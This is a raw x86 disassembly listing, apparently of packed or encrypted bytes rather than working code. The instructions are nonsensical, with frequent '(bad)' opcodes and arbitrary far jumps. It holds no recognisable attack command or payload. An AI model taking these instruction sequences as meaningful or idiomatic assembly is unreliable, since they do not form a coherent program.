  417694:	cmp    dl,BYTE PTR [ebp-0x7acfaa9]
  41769a:	xchg   esi,eax
  41769b:	and    dh,BYTE PTR [edi]
  41769d:	call   0x563efd76
  4176a2:	popf   
  4176a3:	add    edi,ebp
  4176a5:	xchg   ebp,eax
  4176a6:	std    
  4176a7:	dec    eax
  4176a8:	ins    BYTE PTR es:[edi],dx
  4176a9:	inc    edx
  4176aa:	sub    DWORD PTR [eax],0x72
  4176ad:	xchg   DWORD PTR [ecx-0x48],ecx
  4176b0:	xor    esp,esi
  4176b2:	push   0x3ef317c5
  4176b7:	sub    BYTE PTR [ebx],0xbe
  4176ba:	pop    esp
  4176bb:	out    dx,eax
  4176bc:	or     eax,0xfda52acd
  4176c1:	jb     0x4176d7
  4176c3:	dec    ebp
  4176c4:	xor    eax,0x8d939e8c
  4176c9:	jnp    0x417690
  4176cb:	(bad)  
  4176cc:	pop    ss
  4176cd:	mov    esp,0xd6ce1a59
  4176d2:	inc    ebp
  4176d3:	shl    dl,cl
  4176d5:	popf   
  4176d6:	add    DWORD PTR [eax+0x56],ebp
  4176d9:	sbb    al,0x7b
  4176db:	fcomp  DWORD PTR [eax+0x46]
  4176de:	push   cs
  4176df:	adc    ebx,ebp
  4176e1:	adc    DWORD PTR cs:[edx-0x7d7031c0],ebx
  4176e8:	ss and bl,ah
  4176eb:	xor    BYTE PTR [edi-0x370b4e55],dh
  4176f1:	cli    
  4176f2:	loopne 0x417714
  4176f4:	mov    esi,0x8171e7f8
  4176f9:	mov    esp,0xa4f32a07
  4176fe:	sti    
  4176ff:	xchg   ebp,eax
  417700:	mov    ds:0x13a2343a,al
  417705:	add    dl,ch
  417707:	leave  
  417708:	pop    esi
  417709:	imul   ecx,DWORD PTR [ebx+0x33654302],0xbc144c4a
  417713:	test   ah,dl
  417715:	xor    edx,DWORD PTR [ebx]
  417717:	test   al,0x99
  417719:	imul   edx,DWORD PTR [ecx+0x4790e0d3],0x579d6a3d
  417723:	fldl2t 
  417725:	inc    ecx
  417726:	pop    ecx
  417727:	mov    ah,0x74
  417729:	cmp    BYTE PTR [ebx],0xc8
  41772c:	inc    ebx
  41772d:	inc    esp
  41772e:	(bad)  
  41772f:	mov    eax,0x25a2a059
  417734:	jmp    0x254b:0xdfd92db1
  41773b:	xchg   esp,eax
  41773c:	fild   DWORD PTR [eax+ebp*2-0x46]
  417741:	(bad)  
  417742:	leave  
  417743:	pop    edx
  417744:	pop    esi
  417745:	(bad)  
  417746:	(bad)  [eax+0x0]
  417749:	xor    DWORD PTR [ebx+0x396a177e],ebp
  41774f:	pop    ds
  417750:	mov    eax,edi
  417752:	cmp    edi,esi
  417754:	loop   0x4176ed
  417756:	cmp    eax,0xf6a0589b
  41775b:	xchg   DWORD PTR [eax-0x7b],eax
  41775e:	push   edi
  41775f:	dec    edx
  417760:	sub    cl,BYTE PTR [esi+0x45]
  417763:	clc    
  417764:	test   eax,0x4ea763c5
  417769:	and    edx,esi
  41776b:	ror    DWORD PTR [ecx-0x20],1
  41776e:	pop    ebx
  41776f:	(bad)  
  417770:	or     edx,ebp
  417772:	and    esp,DWORD PTR ds:0x5ce2af04
  417778:	sbb    eax,DWORD PTR [eax+0x6a7d749c]
  41777e:	mov    edx,0x75447689
  417783:	mov    al,0xd4
  417785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417786:	jg     0x4177f0
  417788:	fldcw  WORD PTR [ebx]
  41778a:	dec    edi
  41778b:	aaa    
  41778c:	bound  ecx,QWORD PTR [ebp+0x1b]
  41778f:	jae    0x417727
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	rol    BYTE PTR [edi],cl
  417801:	mov    ds:0xf89a779b,eax
  417806:	add    BYTE PTR [eax],al
  417808:	add    eax,0xc0000001
  41780d:	outs   dx,BYTE PTR ds:[esi]
  41780e:	dec    edi
  41780f:	cmp    dl,ch
  417811:	adc    edx,eax
  417813:	cdq    
  417814:	mov    ebx,0x82bfbba4
  417819:	stos   DWORD PTR es:[edi],eax
  41781a:	daa    
  41781b:	mov    eax,ds:0x39ff87bf
  417820:	(bad)  
  417821:	and    eax,0x9e67af14
  417826:	cmp    al,0xc6
  417828:	xor    eax,0x3a45ac44
  41782d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41782e:	hlt    
  41782f:	ins    BYTE PTR es:[edi],dx
  417830:	fisttp DWORD PTR [esi+edi*1]
  417833:	xchg   esi,eax
  417834:	jmp    0x417822
  417836:	sbb    BYTE PTR [edi],0x2
  417839:	adc    esi,esi
  41783b:	repz out dx,al
  41783d:	mov    bl,0x28
  41783f:	imul   ecx,DWORD PTR [edi+0x62],0x4e5c4095
  417846:	dec    edx
  417847:	jb     0x4177e9
  417849:	imul   edi,DWORD PTR [edx-0x1cc8c084],0x81658302
  417853:	or     dl,BYTE PTR [ecx]
  417855:	cdq    
  417856:	push   esi
  417857:	call   0xd2d5:0x213a3950
  41785e:	mov    eax,0xee2a28
  417863:	imul   esi,DWORD PTR [ebp-0x580e63e1],0xffffffe6
  41786a:	xchg   edi,eax
  41786b:	lock jge 0x417847
  41786e:	(bad)  
  417870:	lods   al,BYTE PTR ds:[esi]
  417871:	inc    esi
  417872:	psubsw mm2,QWORD PTR [edi]
  417875:	mov    al,ds:0x3f4793d7
  41787a:	and    DWORD PTR [edx],edx
  41787c:	jl     0x417812
  41787e:	in     al,0x27
  417880:	jnp    0x417845
  417882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417883:	mov    eax,DWORD PTR [eax]
  417885:	test   BYTE PTR [esp+esi*1-0x3baaa5f7],dh
  41788c:	mov    ch,0x86
  41788e:	and    dh,0x79
  417891:	repz loopne 0x417898
  417894:	adc    DWORD PTR ds:0x60e073df,0xffffffee
  41789b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41789c:	push   0x22
  41789e:	xor    edx,esi
  4178a0:	mov    esi,0x37e30e1e
  4178a5:	lock mov eax,0x68e1abae
  4178ab:	jbe    0x417841
  4178ad:	dec    ebp
  4178ae:	push   ss
  4178af:	(bad)  
  4178b0:	out    0x7c,al
  4178b2:	shl    ebx,0x10
  4178b5:	ds (bad) 
  4178b8:	arpl   bx,di
  4178ba:	xor    cl,bl
  4178bc:	pop    ecx
  4178bd:	push   ebp
  4178be:	jnp    0x417915
  4178c0:	in     al,dx
  4178c1:	int3   
  4178c2:	retf   
  4178c3:	ins    BYTE PTR es:[edi],dx
  4178c4:	shl    BYTE PTR [ecx-0x28],0x5a
  4178c8:	test   ecx,esp
  4178ca:	jge    0x41788d
  4178cc:	cwde   
  4178cd:	or     al,0x24
  4178cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178d0:	not    BYTE PTR [esi]
  4178d2:	pop    esi
  4178d3:	or     BYTE PTR [eax-0x34],al
  4178d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178d7:	add    eax,0x8f1eb5be
  4178dc:	xchg   edi,eax
  4178dd:	sub    BYTE PTR [ebx-0x696b5607],ch
  4178e3:	ss mov al,0x7f
  4178e6:	sar    BYTE PTR [ebp-0x2d],0x39
  4178ea:	inc    ecx
  4178eb:	pop    ds
  4178ec:	pop    es
  4178ed:	aad    0x8c
  4178ef:	xchg   esi,eax
  4178f0:	sub    bh,BYTE PTR [esi+esi*1+0x3ab06bd4]
  4178f7:	ficomp WORD PTR [edx]
  4178f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178fa:	stos   BYTE PTR es:[edi],al
  4178fb:	popa   
  4178fc:	and    al,0x24
  4178fe:	mov    eax,DWORD PTR [ebp+0x1f]
  417901:	jle    0x4178f4
  417903:	les    eax,FWORD PTR [edx+0xd]
  417906:	popa   
  417907:	nop
  417908:	cmp    eax,0xe0f9ae26
  41790d:	mov    cl,0x2d
  41790f:	retf   0x5a
	...
  417972:	add    BYTE PTR [eax],al
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	add    eax,0x9fa152be
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0xd1000001
  41798d:	cwde   
  41798e:	cld    
  41798f:	xor    al,0x13
  417991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417992:	inc    esi
  417993:	jp     0x417950
  417995:	add    ecx,ebp
  417997:	mov    ecx,esp
  417999:	fiadd  DWORD PTR [esi-0x49]
  41799c:	jmp    0x667e67ab
  4179a1:	jg     0x4179df
  4179a3:	test   al,0x10
  4179a5:	add    eax,0xbe2fd059
  4179aa:	xchg   esp,eax
  4179ab:	cs jecxz 0x417962
  4179ae:	jae    0x417971
  4179b0:	jae    0x4179a9
  4179b2:	mov    dl,0x30
  4179b4:	test   al,0xe7
  4179b6:	les    edi,FWORD PTR [edx+esi*4-0x4b]
  4179ba:	loop   0x4179ab
  4179bc:	jb     0x4179f8
  4179be:	lods   eax,DWORD PTR cs:[esi]
  4179c0:	and    ebx,eax
  4179c2:	(bad)  ds:0xeb33f749
  4179c8:	and    DWORD PTR ds:[ebx],0xfffffff6
  4179cc:	jmp    0x40e47eb6
  4179d1:	add    al,BYTE PTR [edi+esi*8-0x7c6fb407]
  4179d8:	and    cl,BYTE PTR [ecx+esi*1]
  4179db:	popf   
  4179dc:	xchg   ebp,eax
  4179dd:	mov    WORD PTR [edi+ebx*2+0xb9c47fe],?
  4179e4:	pop    edi
  4179e5:	les    ecx,FWORD PTR [esi*4+0x7bd86b5b]
  4179ec:	add    BYTE PTR [eax-0x14ef7678],0x86
  4179f3:	jnp    0x4179f5
  4179f5:	icebp  
  4179f6:	sbb    cl,BYTE PTR es:[ecx+esi*2+0x53888acd]
  4179fe:	es xchg edi,eax
  417a00:	jmp    0x963e:0x11b4c6dd
  417a07:	mov    DWORD PTR [eax+0x1b],eax
  417a0a:	cld    
  417a0b:	push   esp
  417a0c:	stc    
  417a0d:	dec    ebx
  417a0e:	and    al,bl
  417a10:	in     al,0xd2
  417a12:	mov    dh,dl
  417a14:	jmpw   0xc654
  417a18:	outs   dx,BYTE PTR ds:[esi]
  417a19:	ins    DWORD PTR es:[edi],dx
  417a1a:	mov    al,0xfe
  417a1c:	xchg   ebx,eax
  417a1d:	out    dx,al
  417a1e:	out    0xfb,al
  417a20:	inc    ebp
  417a21:	mov    WORD PTR [edi],?
  417a23:	xor    ah,ah
  417a25:	mov    bl,0x55
  417a27:	cmc    
  417a28:	xor    eax,0xd59c36b3
  417a2d:	add    DWORD PTR [esp+eiz*2],0xbccedfe8
  417a34:	jns    0x417a5a
  417a36:	dec    ecx
  417a37:	cmp    eax,0x5eddeed7
  417a3c:	pusha  
  417a3d:	popfw  
  417a3f:	pushf  
  417a40:	sub    DWORD PTR [edx],edi
  417a42:	imul   edx,edx,0x3450aa64
  417a48:	repz (bad) 
  417a4a:	call   0x1dba4c5e
  417a4f:	stos   BYTE PTR es:[edi],al
  417a50:	repz mov eax,0x59b7b255
  417a56:	inc    ecx
  417a57:	sub    DWORD PTR ds:0xeca3d89,eax
  417a5d:	jno    0x417a95
  417a5f:	jp     0x4179e3
  417a61:	mov    ds:0x332fe6be,eax
  417a66:	das    
  417a67:	fwait
  417a68:	iret   
  417a69:	into   
  417a6a:	push   0x6a28c5a
  417a6f:	mov    cl,0x8e
  417a71:	xchg   ecx,eax
  417a72:	xchg   ecx,eax
  417a73:	mov    ecx,0x9191ad89
  417a78:	pop    esp
  417a79:	das    
  417a7a:	push   ds
  417a7b:	jg     0x417a60
  417a7d:	clc    
  417a7e:	push   edi
  417a7f:	and    al,0x43
  417a81:	jbe    0x417ad2
  417a83:	(bad)  
  417a84:	lods   al,BYTE PTR ds:[esi]
  417a85:	or     ch,bh
  417a87:	xor    dl,0x7d
  417a8a:	cmc    
  417a8b:	and    esi,DWORD PTR [eax]
  417a8d:	stos   BYTE PTR es:[edi],al
  417a8e:	sub    BYTE PTR [ecx+0xd2],ah
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x11c8e00b]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x63000001
  417b0d:	mov    ecx,esp
  417b0f:	imul   BYTE PTR [edx-0x70]
  417b12:	sahf   
  417b13:	mov    cl,0xe1
  417b15:	jo     0x417b89
  417b17:	out    dx,eax
  417b18:	sbb    al,0xb7
  417b1a:	sbb    al,0x4f
  417b1c:	jl     0x417ac9
  417b1e:	(bad)  
  417b1f:	repz inc ebx
  417b21:	and    DWORD PTR [edx-0x57314619],esi
  417b27:	dec    ebx
  417b28:	cmp    BYTE PTR [eax+ebx*1],ah
  417b2b:	cld    
  417b2c:	es mov ebp,0x915879b2
  417b32:	or     dh,0x7e
  417b35:	add    BYTE PTR [ecx],cl
  417b37:	cdq    
  417b38:	or     eax,0xec937ab2
  417b3d:	mov    esi,DWORD PTR [ebx+0x343440ef]
  417b43:	mov    esp,0x144f4b44
  417b48:	pop    edi
  417b49:	cmp    al,0x18
  417b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b4c:	or     eax,0x52e995a7
  417b51:	dec    ebp
  417b52:	call   DWORD PTR [ebx-0x499ad994]
  417b58:	cmc    
  417b59:	lahf   
  417b5a:	sbb    al,0xd4
  417b5c:	push   edx
  417b5d:	mov    dh,0x8a
  417b5f:	or     eax,0xf5835780
  417b64:	cdq    
  417b65:	sbb    BYTE PTR [ebp-0x3e],cl
  417b68:	or     BYTE PTR [ecx-0x7f],al
  417b6b:	jmp    0x13e3:0xb4be5a24
  417b72:	push   eax
  417b73:	(bad)  
  417b74:	scas   al,BYTE PTR es:[edi]
  417b75:	ja     0x417b7e
  417b77:	mov    edx,0x2b6c2cdc
  417b7c:	adc    esi,DWORD PTR [esi-0x7c]
  417b7f:	push   edx
  417b80:	add    ah,BYTE PTR [edi+0x45]
  417b83:	rol    esi,cl
  417b85:	inc    eax
  417b86:	push   edx
  417b87:	mov    cl,0x1d
  417b89:	or     dl,bh
  417b8b:	imul   ecx,DWORD PTR ds:0x54b34952,0x62985777
  417b95:	push   0x21
  417b97:	ja     0x417bfb
  417b99:	scas   al,BYTE PTR es:[edi]
  417b9a:	xor    eax,0x42c14cbf
  417b9f:	inc    esp
  417ba0:	lahf   
  417ba1:	xor    dh,BYTE PTR [ebp+0xdf13044]
  417ba7:	push   ebp
  417ba8:	xchg   DWORD PTR [ebp+0x55],edi
  417bab:	int    0x93
  417bad:	push   es
  417bae:	cmp    al,BYTE PTR [eax+0x25]
  417bb1:	cmp    edi,esi
  417bb3:	cmp    ebx,esp
  417bb5:	jmp    0x1ad1:0x4afd97c7
  417bbc:	mov    dh,0x40
  417bbe:	sub    eax,0x8ce05ac9
  417bc3:	idiv   BYTE PTR [esi+esi*1+0x69]
  417bc7:	mov    WORD PTR [ecx-0x489fb390],ds
  417bcd:	in     al,0x1e
  417bcf:	inc    esi
  417bd0:	movd   edx,mm4
  417bd3:	and    eax,ebp
  417bd5:	pop    edx
  417bd6:	xchg   edi,eax
  417bd7:	jge    0x417b95
  417bd9:	clc    
  417bda:	scas   eax,DWORD PTR es:[edi]
  417bdb:	fcmovu st,st(3)
  417bdd:	mov    ds:0xf931dddc,eax
  417be2:	pusha  
  417be3:	mov    ss,WORD PTR [eax]
  417be5:	fwait
  417be6:	lods   al,BYTE PTR ds:[esi]
  417be7:	daa    
  417be8:	pop    ebx
  417be9:	popf   
  417bea:	shl    BYTE PTR [ebx+0x73574efb],0x13
  417bf1:	aas    
  417bf2:	stc    
  417bf3:	cmp    eax,0x2c1c740b
  417bf8:	mov    ch,0x7b
  417bfa:	inc    ebp
  417bfb:	and    al,0x46
  417bfd:	mov    DWORD PTR [esi+edx*2+0x3d],esp
  417c01:	retf   
  417c02:	and    al,0xef
  417c04:	mov    ds:0xc09170b3,al
  417c09:	xor    eax,0x58d9a9fe
  417c0e:	add    eax,0x62b
	...
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x67
  417c81:	inc    edi
  417c82:	inc    ebp
  417c83:	das    
  417c84:	test   eax,0x50000fb
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    BYTE PTR [ecx-0x77],cl
  417c8e:	mov    ecx,0xb67aafdc
  417c93:	ins    BYTE PTR es:[edi],dx
  417c94:	pop    esi
  417c95:	mov    ah,0x5e
  417c97:	scas   al,BYTE PTR es:[edi]
  417c98:	mov    eax,0xb72bc441
  417c9d:	inc    eax
  417c9e:	pop    esi
  417c9f:	jmp    0xd7de:0xb7226fec
  417ca6:	pop    ds
  417ca7:	leave  
  417ca8:	test   BYTE PTR [eax+ebx*2],ch
  417cab:	test   DWORD PTR [esi+0x79],esi
  417cae:	xchg   edi,eax
  417caf:	(bad)  
  417cb0:	adc    bl,bh
  417cb2:	or     BYTE PTR [edi+0x6e],0x1d
  417cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cb7:	imul   esi,ebp,0xfffffffc
  417cba:	push   ds
  417cbb:	in     al,0xd4
  417cbd:	repz out 0x2b,eax
  417cc0:	mov    ebx,0xcca51d18
  417cc5:	shl    DWORD PTR [esi],0x30
  417cc8:	sti    
  417cc9:	sbb    esp,ebp
  417ccb:	(bad)  
  417ccc:	bound  esi,QWORD PTR [ebp-0x25]
  417ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cd0:	xor    edi,DWORD PTR [ebx+0x387f103b]
  417cd6:	mov    bh,0x51
  417cd8:	mov    al,0xb5
  417cda:	in     eax,dx
  417cdb:	call   0xeaeca826
  417ce0:	push   edi
  417ce1:	add    dl,cl
  417ce3:	lods   al,BYTE PTR ds:[esi]
  417ce4:	push   0x5e27732b
  417ce9:	and    bl,BYTE PTR [eax+0x5e]
  417cec:	pusha  
  417ced:	retf   0xf684
  417cf0:	push   esp
  417cf1:	aam    0xd4
  417cf3:	jo     0x417c85
  417cf5:	out    0x6a,al
  417cf7:	sahf   
  417cf8:	push   cs
  417cf9:	out    dx,al
  417cfa:	(bad)  
  417cfb:	mov    ebx,0xef5bba14
  417d00:	not    BYTE PTR [edi-0x2ae9c7ac]
  417d06:	ret    
  417d07:	lock clc 
  417d09:	mov    ch,0x5b
  417d0b:	outs   dx,BYTE PTR ds:[esi]
  417d0c:	lahf   
  417d0d:	loopne 0x417d10
  417d0f:	adc    ecx,ebp
  417d11:	fistp  DWORD PTR [ebx-0x34de0bd]
  417d17:	icebp  
  417d18:	frstor [edx-0x1d7d122b]
  417d1e:	sbb    ch,ch
  417d20:	sbb    eax,0x31c8ec98
  417d25:	push   esi
  417d26:	xor    eax,0x1de2f7c6
  417d2b:	ins    DWORD PTR es:[edi],dx
  417d2c:	test   al,0xc3
  417d2e:	mov    al,ds:0x9129ce07
  417d33:	enter  0xd3f3,0xd5
  417d37:	pop    esi
  417d38:	int    0x46
  417d3a:	ins    BYTE PTR es:[edi],dx
  417d3b:	jbe    0x417cf1
  417d3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d3e:	jle    0x417d05
  417d40:	mov    bl,0x58
  417d42:	dec    edx
  417d43:	fs nop
  417d45:	add    ah,dh
  417d47:	cmp    edi,ebx
  417d49:	cmp    eax,0xdac35bff
  417d4e:	mov    ds:0xe23f1181,al
  417d53:	test   al,0x61
  417d55:	pop    eax
  417d56:	icebp  
  417d57:	push   esi
  417d58:	(bad)  
  417d59:	lea    ebx,[esi-0x70]
  417d5c:	in     al,dx
  417d5d:	inc    ebp
  417d5e:	sub    BYTE PTR [ebx+eiz*4+0x6d1829ff],bh
  417d65:	xchg   ecx,eax
  417d66:	out    0x73,al
  417d68:	push   ss
  417d69:	test   BYTE PTR [eax],dh
  417d6b:	cdq    
  417d6c:	dec    eax
  417d6d:	call   0xf6e6:0x5cc1382e
  417d74:	shl    BYTE PTR [eax],1
  417d76:	push   0x12d2d2fb
  417d7b:	imul   esp,DWORD PTR [ebx],0xffffff95
  417d7e:	idiv   DWORD PTR [ebx+0x5b]
  417d81:	adc    al,0x9e
  417d83:	imul   esi,ecx,0x745a36c3
  417d89:	shl    DWORD PTR [ebx+0x7a7235e2],0x29
  417d90:	add    DWORD PTR [eax],0x0
	...
  417df2:	add    BYTE PTR [eax],al
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	cmp    DWORD PTR [edx-0x351bcd8],ecx
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0x22000001
  417e0d:	jnp    0x417dae
  417e0f:	xor    dl,BYTE PTR [ebp-0x24]
  417e12:	arpl   dx,dx
  417e14:	or     ah,BYTE PTR [edx-0x26c8d02e]
  417e1a:	lods   al,BYTE PTR ds:[esi]
  417e1b:	mov    ah,0xd
  417e1d:	mov    esp,gs
  417e1f:	outs   dx,BYTE PTR ds:[esi]
  417e20:	cmp    al,0xd2
  417e22:	inc    esi
  417e23:	sbb    al,0x92
  417e25:	in     al,0x57
  417e27:	popa   
  417e28:	push   0x70230d7e
  417e2d:	adc    eax,esp
  417e2f:	mov    DWORD PTR [edi+0x5f20886d],0x57cc833e
  417e39:	push   esi
  417e3a:	scas   eax,DWORD PTR es:[edi]
  417e3b:	sti    
  417e3c:	daa    
  417e3d:	dec    ebx
  417e3e:	jg     0x417e93
  417e40:	sbb    BYTE PTR [edi+eiz*1+0x47],0x41
  417e45:	sbb    edx,esp
  417e47:	jp     0x417eb0
  417e49:	dec    ebx
  417e4a:	in     al,0xc5
  417e4c:	mov    cl,0xa3
  417e4e:	fild   WORD PTR [eax+0x28]
  417e51:	mov    ecx,0xd7c4fa42
  417e56:	shl    BYTE PTR [ecx+0xd],0x85
  417e5a:	test   DWORD PTR [edx],esp
  417e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e5d:	dec    edx
  417e5e:	xlat   BYTE PTR ds:[ebx]
  417e5f:	fwait
  417e60:	jbe    0x417e84
  417e62:	sbb    al,0xfd
  417e64:	mov    ebx,0x7090b9fe
  417e69:	cmp    BYTE PTR [esi-0x16],al
  417e6c:	pop    ebp
  417e6d:	retf   
  417e6e:	pop    edx
  417e6f:	loope  0x417e3f
  417e71:	push   ds
  417e72:	inc    ebp
  417e73:	gs data16 add dl,0x24
  417e78:	xlat   BYTE PTR ds:[ebx]
  417e79:	mul    edx
  417e7b:	and    al,0xa5
  417e7d:	pop    ecx
  417e7e:	jb     0x417e49
  417e80:	stos   BYTE PTR es:[edi],al
  417e81:	fstp   DWORD PTR [ebx]
  417e83:	fs in  eax,dx
  417e85:	sub    eax,0xff6c3b7b
  417e8a:	dec    eax
  417e8b:	and    edi,DWORD PTR [esi-0x3bbabbb7]
  417e91:	imul   esp,ebp,0x6fba16ff
  417e97:	mov    bl,BYTE PTR [eax+0x2abcbbbd]
  417e9d:	inc    edx
  417e9e:	dec    esi
  417e9f:	adc    esi,0x25
  417ea2:	push   edi
  417ea3:	gs push es
  417ea5:	int    0x4d
  417ea7:	cmp    ah,0xb2
  417eaa:	loop   0x417edc
  417eac:	dec    ebx
  417eae:	daa    
  417eaf:	mov    ebp,0x885d3db
  417eb4:	les    ebp,FWORD PTR [ebx]
  417eb6:	mul    ecx
  417eb8:	call   0x64e8:0x644a2a8f
  417ebf:	jg     0x417ea1
  417ec1:	pop    es
  417ec2:	jmp    0x8b270480
  417ec7:	les    ebx,FWORD PTR [esi-0x265c728d]
  417ecd:	jne    0x417ea5
  417ecf:	call   0xba6b:0xeb042bc1
  417ed6:	xchg   esp,eax
  417ed7:	imul   ebx,DWORD PTR [edx],0xd578300e
  417edd:	out    0x68,eax
  417edf:	push   edi
  417ee0:	nop
  417ee1:	jb     0x417f4b
  417ee3:	mov    esi,0xf25a82b3
  417ee8:	cmp    DWORD PTR [edx+0x58344384],edi
  417eee:	sbb    esi,DWORD PTR [eax+0x66]
  417ef1:	pop    ecx
  417ef2:	sbb    al,0x5f
  417ef4:	out    dx,eax
  417ef5:	sbb    eax,DWORD PTR [di+0x4c46]
  417efa:	dec    edi
  417efb:	mov    dh,0x65
  417efd:	xor    esi,DWORD PTR [esi-0x7eca6acf]
  417f03:	jne    0x417f3b
  417f05:	sbb    ecx,DWORD PTR [ebx]
  417f07:	and    BYTE PTR [ebx-0x189599aa],bh
  417f0d:	(bad)  
  417f0e:	adc    WORD PTR [eax+0x0],ax
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	fs jne 0x417fb3
  417f83:	sbb    eax,0xfdb3
  417f88:	add    eax,0x20000001
  417f8d:	jle    0x417f8c
  417f8f:	stos   DWORD PTR es:[edi],eax
  417f90:	into   
  417f91:	in     al,dx
  417f92:	xor    ecx,DWORD PTR [ecx-0x31]
  417f95:	iret   
  417f96:	jns    0x417f23
  417f98:	dec    ebx
  417f99:	xchg   ebp,eax
  417f9a:	sbb    eax,0x7ee9f3d
  417f9f:	repnz mov ah,BYTE PTR cs:[edx]
  417fa3:	pop    esi
  417fa4:	sbb    BYTE PTR [ebp+0x5b2f2c55],0x8
  417fab:	cmp    eax,0x4226fa5e
  417fb0:	jns    0x417fe5
  417fb2:	and    eax,DWORD PTR [esi+0x2]
  417fb5:	dec    esp
  417fb6:	mov    edi,DWORD PTR [esp+edx*1-0x9adbb5b]
  417fbd:	sbb    BYTE PTR [ecx],dl
  417fbf:	cmc    
  417fc0:	xor    eax,0x815e48d6
  417fc5:	mov    esi,0x4d325aea
  417fca:	push   esi
  417fcb:	mov    dh,0xd6
  417fcd:	bound  eax,QWORD PTR [ecx-0x78]
  417fd0:	mov    bh,0x2
  417fd2:	sub    bh,ah
  417fd4:	sub    ch,BYTE PTR [ebp-0x25]
  417fd7:	adc    esi,DWORD PTR [ecx]
  417fd9:	aas    
  417fda:	test   eax,0xed2c55c7
  417fdf:	jno    0x417f67
  417fe1:	and    eax,esp
  417fe3:	sbb    eax,0xf0ad0ef1
  417fe8:	mov    ecx,esp
  417fea:	cmp    eax,0x99e199fc
  417fef:	cmp    al,BYTE PTR [eax]
  417ff1:	pop    ss
  417ff2:	xchg   BYTE PTR [eax-0xa5997f6],dl
  417ff8:	test   DWORD PTR [ebx+0x75],edx
  417ffb:	xchg   ecx,eax
  417ffc:	push   ebp
  417ffd:	jbe    0x41801d
  417fff:	es xchg edi,eax
  418001:	fstp   QWORD PTR [edi-0x4a6ba5a5]
  418007:	and    ebp,eax
  418009:	and    bh,BYTE PTR ds:0x4092d4d7
  41800f:	push   ebp
  418010:	out    0x8a,eax
  418012:	jne    0x417ff9
  418014:	xor    DWORD PTR [ecx+0x1c8d70ba],esi
  41801a:	aad    0x9e
  41801c:	stc    
  41801d:	cmp    BYTE PTR [edi],0x48
  418020:	cld    
  418021:	iret   
  418022:	sub    BYTE PTR [eax-0x2a013b07],cl
  418028:	push   esi
  418029:	test   al,0x46
  41802b:	mov    cl,dh
  41802d:	xchg   dl,dl
  41802f:	nop
  418030:	cld    
  418031:	popa   
  418032:	out    dx,eax
  418033:	mov    bl,0x2
  418035:	or     ecx,DWORD PTR [edi+ecx*4]
  418038:	imul   eax,edx,0xe244cd7a
  41803e:	dec    ebp
  41803f:	jmp    0x418023
  418041:	into   
  418042:	lods   eax,DWORD PTR ds:[esi]
  418043:	sub    esi,DWORD PTR [esi+0x7f]
  418046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418047:	enter  0x947d,0x6e
  41804b:	sub    eax,0xba9c900a
  418050:	mov    dl,0xf9
  418052:	push   eax
  418053:	loop   0x4180c4
  418055:	mov    fs,esp
  418057:	or     BYTE PTR [edx+0x3893e540],cl
  41805d:	sub    BYTE PTR [esi-0x37ad178f],dh
  418063:	cmp    eax,ebp
  418065:	xchg   ebx,eax
  418066:	cli    
  418067:	mov    esp,0x7686b0dc
  41806c:	out    dx,al
  41806d:	xchg   BYTE PTR [edx-0x49f4797a],bl
  418073:	repnz xchg esp,eax
  418075:	outs   dx,DWORD PTR ds:[esi]
  418076:	stc    
  418077:	cli    
  418078:	lahf   
  418079:	out    dx,eax
  41807a:	inc    eax
  41807b:	cmp    DWORD PTR [edx],ecx
  41807d:	push   ecx
  41807e:	dec    edi
  41807f:	sub    ebx,DWORD PTR [edx+eax*4+0x2f]
  418083:	adc    edx,DWORD PTR [ebx]
  418085:	jl     0x4180fa
  418087:	dec    ecx
  418088:	push   ds
  418089:	pop    ds
  41808a:	or     DWORD PTR [esi+0x5c181ab7],ebp
  418090:	pop    ss
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
